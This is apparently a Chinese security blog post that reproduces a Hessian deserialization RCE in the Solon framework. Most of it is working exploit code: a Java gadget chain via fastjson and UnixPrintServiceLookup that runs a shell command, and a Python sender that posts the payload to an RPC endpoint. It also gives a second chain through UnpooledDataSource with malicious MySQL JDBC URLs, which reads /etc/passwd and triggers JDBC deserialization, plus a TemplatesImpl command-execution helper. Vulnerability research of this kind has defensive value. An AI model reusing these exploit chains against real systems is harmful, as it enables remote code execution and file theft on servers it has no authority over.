# Solon-Hessian反序列化RCE

  
  
&lt;!--more--&gt;  
## 0x00 环境搭建  
https://github.com/gfast777-sec/solon-example  
## 0x01 漏洞复现  
POC  
```java  
package demo3041;    
    
import com.alibaba.fastjson.JSONArray;    
import com.alibaba.fastjson.JSONObject;    
import com.caucho.hessian.io.Hessian2Output;    
import com.caucho.hessian.io.SerializerFactory;    
import sun.misc.Unsafe;    
import sun.print.UnixPrintServiceLookup;    
import java.io.ByteArrayOutputStream;    
import java.io.File;    
import java.io.FileOutputStream;    
import java.lang.reflect.Field;    
    
public class PoC {    
    
    public static void main(String[] args) throws Exception {    
        String cmd = &#34;touch /tmp/evilfile&#34;;    
        Field theUnsafe = Unsafe.class.getDeclaredField(&#34;theUnsafe&#34;);    
        theUnsafe.setAccessible(true);    
        Unsafe unsafe = (Unsafe) theUnsafe.get(null);    
        Object unixPrintServiceLookup = unsafe.allocateInstance(UnixPrintServiceLookup.class);    
    
        setFieldValue(unixPrintServiceLookup, &#34;cmdIndex&#34;, 0);    
        setFieldValue(unixPrintServiceLookup, &#34;osname&#34;, &#34;xx&#34;);    
        setFieldValue(unixPrintServiceLookup, &#34;lpcFirstCom&#34;, new String[]{cmd, cmd, cmd});    
    
        JSONObject jsonObject = new JSONObject();    
        jsonObject.put(&#34;xx&#34;, unixPrintServiceLookup);    
    
        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();    
        Hessian2Output hessianOutput = new Hessian2Output(byteArrayOutputStream);    
        hessianOutput.setSerializerFactory(new SerializerFactory());    
        hessianOutput.getSerializerFactory().setAllowNonSerializable(true);    
        hessianOutput.writeObject(jsonObject);    
        hessianOutput.flushBuffer();    
    
        byte[] data = byteArrayOutputStream.toByteArray();    
    
        byte[] poc = new byte[data.length &#43; 1];    
        System.arraycopy(new byte[]{67}, 0, poc, 0, 1);    
        System.arraycopy(data, 0, poc, 1, data.length);    
    
        FileOutputStream fileOutputStream=new FileOutputStream(new File(&#34;/tmp/ser&#34;));    
        fileOutputStream.write(poc);    
    }    
    
    public static void setFieldValue(Object object, String field, Object arg) throws NoSuchFieldException, IllegalAccessException {    
        Field f = object.getClass().getDeclaredField(field);    
        f.setAccessible(true);    
        f.set(object, arg);    
    }    
    
}  
```  
  
```python  
import requests    
with open(&#34;/tmp/ser&#34;,&#34;rb&#34;) as f:    
    body= f.read()    
    print(len(body))    
    burp0_url = &#34;http://127.0.0.1:8089/rpc/v1/user/getUser&#34;    
    headers=burp0_headers = {&#34;User-Agent&#34;: &#34;Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:102.0) Gecko/20100101 Firefox/102.0&#34;, &#34;Accept&#34;: &#34;text/html,application/xhtml&#43;xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8&#34;, &#34;Accept-Language&#34;: &#34;zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&#34;, &#34;Accept-Encoding&#34;: &#34;deflate&#34;, &#34;Connection&#34;: &#34;close&#34;, &#34;Content-Type&#34;: &#34;application/hessian&#34;, &#34;Upgrade-Insecure-Requests&#34;: &#34;1&#34;, &#34;Sec-Fetch-Dest&#34;: &#34;document&#34;, &#34;Sec-Fetch-Mode&#34;: &#34;navigate&#34;, &#34;Sec-Fetch-Site&#34;: &#34;none&#34;, &#34;Sec-Fetch-User&#34;: &#34;?1&#34;}    
    requests.get(burp0_url,headers=headers,data=body)  
```  
只能在`jdk&amp;&amp;Linux`环境下攻击成功  
## 0x02 漏洞复现  
在此处打个断点，查看调用栈  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202412172311485.png)
如果传入的数据是二进制数据会在进入到`Hessian`中的`changeBody`方法  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202412172323513.png)
可以看到正好存在`readObject`方法，导致反序列化，接下来找一条链子  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202412172325088.png)
`lib`中存在`fastjson`和`soft-hessian`所以可以直接调用`toString`到`getter`  
这里的`getter`直接调用`sun.print.unixPrintServiceLookup#getDefaultPrintService()`  
即可RCE  
这样的链子局限性还是很大的，所以这里找一个其他的 sink 点  
在`org.noear.solon.data.util.UnpooledDataSource#getConnection()`方法，导入依赖  
pom.xml  
```xml  
&lt;dependency&gt;    
    &lt;groupId&gt;mysql&lt;/groupId&gt;    
    &lt;artifactId&gt;mysql-connector-java&lt;/artifactId&gt;    
    &lt;version&gt;8.0.13&lt;/version&gt;    
&lt;/dependency&gt;  
```  
EXP  
```java  
package demo3041;    
    
import com.alibaba.fastjson.JSONObject;    
import com.caucho.hessian.io.Hessian2Output;    
import com.caucho.hessian.io.SerializerFactory;    
import javassist.CannotCompileException;    
import javassist.ClassPool;    
import javassist.CtClass;    
import javassist.NotFoundException;    
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;    
import org.noear.solon.data.util.UnpooledDataSource;    
    
import java.io.ByteArrayOutputStream;    
import java.io.File;    
import java.io.FileOutputStream;    
import java.io.IOException;    
import java.lang.reflect.Field;    
import java.util.UUID;    
    
public class PoC {    
    
    public static void main(String[] args) throws Exception {    
    
        UnpooledDataSource unpooledDataSource = new UnpooledDataSource(&#34;jdbc:mysql://127.0.0.1:3307/test?user=fileread_/etc/passwd&#34;,&#34;linux_passwd&#34;,&#34;huahua123&#34;,&#34;com.mysql.cj.jdbc.Driver&#34;);    
        JSONObject jsonObject = new JSONObject();    
        jsonObject.put(&#34;xx&#34;, unpooledDataSource);    
    
        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();    
        Hessian2Output hessianOutput = new Hessian2Output(byteArrayOutputStream);    
        hessianOutput.setSerializerFactory(new SerializerFactory());    
        hessianOutput.getSerializerFactory().setAllowNonSerializable(true);    
        hessianOutput.writeObject(jsonObject);    
        hessianOutput.flushBuffer();    
    
        byte[] data = byteArrayOutputStream.toByteArray();    
    
        byte[] poc = new byte[data.length &#43; 1];    
        System.arraycopy(new byte[]{67}, 0, poc, 0, 1);    
        System.arraycopy(data, 0, poc, 1, data.length);    
    
        FileOutputStream fileOutputStream = new FileOutputStream(new File(&#34;/tmp/ser&#34;));    
        fileOutputStream.write(poc);    
    }    
    
    public static void setFieldValue(Object object, String field, Object arg) throws NoSuchFieldException, IllegalAccessException {    
        Field f = object.getClass().getDeclaredField(field);    
        f.setAccessible(true);    
        f.set(object, arg);    
    }    
    public static byte[] getTemplates () throws CannotCompileException, IOException, NotFoundException {    
        ClassPool classPool = ClassPool.getDefault();    
        // 生成一个随机的类名    
        String randomClassName = &#34;Test_&#34; &#43; UUID.randomUUID().toString().replace(&#34;-&#34;, &#34;&#34;);    
        CtClass ctClass = classPool.makeClass(randomClassName);    
        ctClass.setSuperclass(classPool.get(&#34;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&#34;));    
        String block = &#34;Runtime.getRuntime().exec(\&#34;open -a Calculator\&#34;);&#34;;    
        ctClass.makeClassInitializer().insertBefore(block);    
        return ctClass.toBytecode();    
    }    
    
}  
```  
但是任意文件读取还是有限制的，我们这里直接打 JDBC 反序列化 RCE  
利用这个项目打 Fastjson   
https://github.com/Y4er/ysoserial  
```java  
UnpooledDataSource unpooledDataSource = new UnpooledDataSource(&#34;jdbc:mysql://127.0.0.1:3307/test?autoDeserialize=true&amp;queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&#34;,&#34;JavaDeserialize&#34;,&#34;huahua123&#34;,&#34;com.mysql.cj.jdbc.Driver&#34;);  
```  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202412191604554.png)
## Reference  
https://github.com/opensolon/solon/issues/73  
  

---

> Author: N1Rvana  
> URL: https://nlrvana.github.io/solon-hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96rce/  

